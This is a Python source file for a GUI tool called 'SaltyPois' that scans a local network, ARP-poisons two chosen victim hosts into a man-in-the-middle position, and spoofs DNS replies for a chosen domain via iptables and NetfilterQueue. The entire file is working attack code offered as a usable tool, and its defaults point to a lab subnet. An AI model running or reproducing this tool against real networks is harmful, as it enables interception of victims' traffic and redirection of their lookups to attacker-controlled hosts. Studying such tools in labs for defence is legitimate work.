from Tkinter import *
from netfilterqueue import NetfilterQueue
from scapy.all import *
import sys
from datetime import datetime
import socket
import thread
import os

DnsState = False

os.system('sysctl -w net.ipv4.ip_forward=1')
localIP = socket.gethostbyname(socket.gethostname())  # IP address for poisoned hosts.
nfq = NetfilterQueue()


# display availible interfaces
def showInterfaces():
    for iface in get_if_list():
        prt(iface)


# network scanner
def netword_scaner(iface, range):
    prt("Started scanning")

    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=range),
                     timeout=2, iface=iface, inter=0.002)

    prt("MAC - IP\n")
    for snd, rcv in ans:
        prt(rcv.sprintf(r"%Ether.src% - %ARP.psrc%"))
        # rcv.sprintf(r"%Ether.src% - %ARP.psrc%"))
    prt("Scanning completed")


def start_scan():
    iface = eif.get()
    range = erange.get()
    if not iface:
        prt("you need to select an valid interface.")
        return
    ifList = get_if_list()
    if (not str(iface) in ifList):
        prt("you need to select an valid interface.")
        return
    if not range:
        prt("You need to enter a range.")
        return
    prt("Starting scanner on interface:")
    prt("    " + iface)
    prt("Over range:")
    prt("    " + range + "\n")
    thread.start_new_thread(netword_scaner, (iface, range))


# arp poisoner
def sendARP(target1, mac1, target2, mac2):
    send(ARP(op=2, pdst=target1, psrc=target2, hwdst=mac1))
    send(ARP(op=2, pdst=target2, psrc=target1, hwdst=mac2))
    prt("ARP packets send!")


def getMac(IP):
    interface = eif.get()
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def Arp(target1, target2):
    global arping
    mac1 = getMac(target1)
    mac2 = getMac(target2)
    while arping:
        prt("Sending Arp Poison Packets!\n")
        sendARP(target1, mac1, target2, mac2)
        time.sleep(5)
    reArp(target1, mac1, target2, mac2)


def reArp(target1, mac1, target2, mac2):
    prt("Re-Arping Victims\n")
    send(ARP(op=2, pdst=target2, psrc=target1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac1), count=7)
    send(ARP(op=2, pdst=target1, psrc=target2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac2), count=7)


arping = True


def toggle_arp():
    global arping
    if (arping):
        arping = False
        arpBtn.set("start arp poisoning!")
    else:
        iface = eif.get()
        target1 = victim1.get()
        target2 = victim2.get()
        if not iface:
            prt("you need to select an interface.")
            return
        if not target1:
            prt("You need to enter a first target.")
            return
        if not target2:
            prt("You need to enter a second target.")
            return
        arping = True
        arpBtn.set("stop arp poisoning")
        prt("Starting arp spoofing over interface:")
        prt("    " + iface)
        prt("between victims at:")
        prt("    " + target1 + " and " + target2 + "\n")
        thread.start_new_thread(Arp, (target1, target2,))

domain = 'nothing'
# dns spoofer
def callback(packet):
    global domain
    payload = packet.get_payload()
    pkt = IP(payload)

    if pkt.haslayer(DNSQR):
        prt(str(pkt[DNS].qd.qname))
        if domain in pkt[DNS].qd.qname:
            prt("Spoofing with ip")
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=20, rdata=spoofIp.get()))
            packet.set_payload(str(spoofed_pkt))
            packet.accept()
        else:
            packet.accept()
    else:
        packet.accept()


def dnsmain(nfq):
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
    nfq.bind(1, callback)
    try:
        dnsBtn.set("stop dns spoofing")
        nfq.run()  # Main loop
    except KeyboardInterrupt:
        DnsState = False
        nfq.unbind()
        os.system('iptables -F')
        os.system('iptables -X')
        dnsBtn.set("start dns spoofing")
        prt("Stopping DNS spoofing")


def toggle_dns():
    global dnsBtn
    global DnsState
    global nfq
    if (DnsState):
        DnsState = False
        nfq.unbind()
        os.system('iptables -F')
        os.system('iptables -X')
        dnsBtn.set("start dns spoofing")
        prt("stopping DNS spoofing via interface")
    else:
        global domain
        domain = domain1.get()
        if not domain:
            prt("you need to enter a domain on which you want to spoof")
            return
        ip = spoofIp.get()
        if not ip:
            prt("you need to enter an ip address to which you would like\n to point the dns spoofing")
            return
        DnsState = True
        prt("Starting DNS spoofing")
        dnsmain(nfq)


# gui definitions
def prt(string):
    outputWindow.configure(state='normal')
    outputWindow.insert(END, string + "\n")
    outputWindow.see("end")
    outputWindow.configure(state=DISABLED)


root = Tk()
root.title('SaltyPois')
# menubar
menubar = Frame(root)
menubar.pack(side=TOP, fill=X)

# top frames
topFrame = Frame(root)
topFrame.pack(fill=Y)

topLeft = Frame(topFrame)
topLeft.pack(side=LEFT, fill=Y)
topRight = Frame(topFrame)
topRight.pack(side=RIGHT, fill=Y)

# topRight frame
outMenu = Frame(topRight)
label1 = Label(outMenu, text="Output window:")
label1.pack(side=LEFT)
outMenu.grid(row=0)

outWindow = Frame(topRight)
outWindow.grid(row=1)

# interfaces frame
interfaces = Frame(topLeft)

button2 = Button(interfaces, text="show interfaces", command=showInterfaces)
button2.pack(side=TOP)

labelif = Label(interfaces, text="interface:")
labelif.pack(side=TOP)
eif = Entry(interfaces)
eif.pack(side=TOP)
eif.insert(0, "enp0s3")

interfaces.pack(side=TOP, fill=X)

# scanner frame
scanner = Frame(topLeft)

labelrange = Label(scanner, text="ip range:")
labelrange.pack(side=TOP)
erange = Entry(scanner)
erange.pack(side=TOP)
erange.insert(0, ("192.168.56.0/24"))

button3 = Button(scanner, text="start netscanner", command=start_scan)
button3.pack(side=TOP)

scanner.pack(side=TOP)

# arp spoofer frame
arp = Frame(topLeft)

labelif = Label(arp, text="ip victim1:")
labelif.pack(side=TOP)
victim1 = Entry(arp)
victim1.pack(side=TOP)

labelrange = Label(arp, text="ip victim2:")
labelrange.pack(side=TOP)
victim2 = Entry(arp)
victim2.pack(side=TOP)

arpBtn = StringVar()
button3 = Button(arp, textvariable=arpBtn, command=toggle_arp)
button3.pack(side=TOP)

arpBtn.set("start arp poisoning")

arp.pack(side=TOP)

# dns spoofer frame
dns = Frame(topLeft)

labelDomain = Label(dns, text="domain to be spoofed")
labelDomain.pack(side=TOP)
domain1 = Entry(dns)
domain1.pack(side=TOP)

labelIp = Label(dns, text="DNS spoof ip")
labelIp.pack(side=TOP)
spoofIp = Entry(dns)
spoofIp.pack(side=TOP)

dnsBtn = StringVar()
button4 = Button(dns, textvariable=dnsBtn, command=toggle_dns)
button4.pack(side=TOP)

dnsBtn.set("start dns spoofing")

dns.pack(side=TOP)

# define input window(top left)

# define output window
outputWindow = Text(outWindow, height=25, width=60)
outputWindow.pack(side=LEFT, fill=Y)
scrollbar = Scrollbar(outWindow)
scrollbar.pack(side=RIGHT, fill=Y)
scrollbar.config(command=outputWindow.yview)
outputWindow.config(yscrollcommand=scrollbar.set, state=DISABLED)

count = 0;

root.mainloop()
